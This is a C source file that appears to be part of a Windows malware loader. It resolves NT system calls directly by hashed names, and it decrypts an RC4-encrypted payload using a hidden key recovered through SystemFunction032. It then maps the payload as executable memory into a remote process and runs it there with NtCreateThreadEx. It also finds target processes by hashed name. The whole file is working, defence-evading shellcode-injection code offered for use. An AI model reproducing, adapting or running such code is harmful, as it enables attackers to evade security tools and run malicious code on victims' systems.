#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "Debug.h"

UCHAR ProtectedKey[] = { 0x36, 0x26, 0x54, 0x7A, 0x42, 0xFA, 0x3B, 0x72, 0xBF, 0x35, 0x45, 0x2C, 0xBD, 0x80, 0x76, 0x87 };

VX_TABLE 	g_Sys = { 0 };
API_HASHING g_Api = { 0 };

BOOL InitializeSyscalls() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;

	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}

BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize) {

	NTSTATUS        	STATUS = NULL;
	BYTE			RealKey[KEY_SIZE] = { 0 };
	int			    b = 0;

	while (1) {
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		else
			b++;
	}

#ifdef DEBUG
	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif

	for (int i = 0; i < KEY_SIZE; i++) {
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
	}

	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("Advapi32"), SystemFunction032_JOAA);

	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

	HANDLE          hSection = NULL;
	HANDLE          hThread = NULL;
	PVOID           pLocalAddress = NULL,
		pRemoteAddress = NULL,
		pExecAddress = NULL;
	NTSTATUS        STATUS = NULL;
	SIZE_T          sViewSize = NULL;
	LARGE_INTEGER   MaximumSize = {
		  .HighPart = 0,
		  .LowPart = sPayloadSize
	};

	DWORD           dwLocalFlag = PAGE_READWRITE;

	ConfS(g_Sys.NtCreateSection.wSysC);
	if ((STATUS = RunSys(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	if (bLocal) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	ConfS(g_Sys.NtMapViewOfSection.wSysC);
	if ((STATUS = RunSys(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, dwLocalFlag)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);
#endif

	Rc4EncryptionViSystemFunc032(ProtectedKey, pPayload, KEY_SIZE, sPayloadSize);
	_memcpy(pLocalAddress, pPayload, sPayloadSize);
#ifdef DEBUG
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);
#endif

	if (!bLocal) {

		ConfS(g_Sys.NtMapViewOfSection.wSysC);
		if ((STATUS = RunSys(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

#ifdef DEBUG
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);
#endif

	}

	pExecAddress = pRemoteAddress;
	if (bLocal) {
		pExecAddress = pLocalAddress;
	}
#ifdef DEBUG
	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
#endif
	ConfS(g_Sys.NtCreateThreadEx.wSysC);
	if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
#endif

	ConfS(g_Sys.NtWaitForSingleObject.wSysC);
	if ((STATUS = RunSys(hThread, FALSE, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	ConfS(g_Sys.NtUnmapViewOfSection.wSysC);
	if ((STATUS = RunSys((HANDLE)-1, pLocalAddress)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	ConfS(g_Sys.NtClose.wSysC);
	if ((STATUS = RunSys(hSection)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	ULONG					    uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
	PVOID					    pValueToFree = NULL;
	NTSTATUS				    STATUS = NULL;

	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
	RunSys(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	pValueToFree = SystemProcInfo;

	ConfS(g_Sys.NtQuerySystemInformation.wSysC);
	STATUS = RunSys(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	while (TRUE) {

		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == szProcName) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		if (!SystemProcInfo->NextEntryOffset)
			break;

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}